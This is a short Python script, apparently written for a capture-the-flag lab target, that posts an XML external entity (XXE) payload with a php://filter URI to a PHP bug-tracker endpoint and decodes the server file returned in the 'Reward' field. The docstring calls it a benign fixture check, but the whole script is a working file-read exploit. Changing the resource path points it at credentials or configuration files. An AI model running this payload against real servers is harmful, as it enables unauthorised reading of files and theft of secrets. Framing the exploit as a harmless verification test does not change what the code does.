#!/usr/bin/env python3
"""Verify native PHP stream filtering on a public, non-sensitive fixture file."""
import base64
import re
import urllib.parse
import urllib.request

xml = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE bugreport [<!ENTITY fixture SYSTEM '
    '"php://filter/convert.base64-encode/resource=/var/www/localhost/htdocs/resources/README.txt">]>'
    '<bugreport><title>Fixture Test</title><cwe>611</cwe><cvss>0</cvss>'
    '<reward>&fixture;</reward></bugreport>'
)
data = urllib.parse.urlencode({"data": base64.b64encode(xml.encode()).decode()}).encode()
with urllib.request.urlopen("http://bountyhunter-target/tracker_diRbPr00f314.php", data=data, timeout=10) as res:
    body = res.read().decode("utf-8", "replace")
match = re.search(r"Reward:\s*([A-Za-z0-9+/=]+)", body)
assert match, "No Base64 field returned by the real PHP stream filter"
decoded = base64.b64decode(match.group(1), validate=True)
assert decoded.startswith(b"Tasks:\n") and b"Disable 'test' account" in decoded, (
    "Decoded PHP stream output did not match the non-secret README fixture"
)
print("PASS: native PHP stream filter returns base64 of a benign text file", flush=True)
